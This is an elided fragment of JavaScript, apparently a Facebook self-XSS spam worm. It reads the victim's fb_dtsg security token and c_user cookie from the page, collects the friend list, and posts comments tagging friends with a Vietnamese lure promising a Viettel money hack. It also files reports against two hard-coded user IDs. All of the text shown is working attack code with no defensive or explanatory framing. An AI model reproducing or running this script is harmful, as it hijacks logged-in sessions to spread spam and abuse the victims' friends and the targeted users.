...
mesaj += "  Tin Hot...Hack tiền Viettel nè mn :* @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
...
function yorum_yap(id ,mesaj) {
 ...
 params +="&source=2";
 params +="&client_id=227788704082634:1707018092";
 params +="&reply_fbid";
 ...
 xhr.open("POST", "/ajax/ufi/add_comment.php", true);
    ...
    xhr.send(params);
        ...
        arkadaslari_al(1402908906649228);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
...
report("100001002444064");report("100003714744618");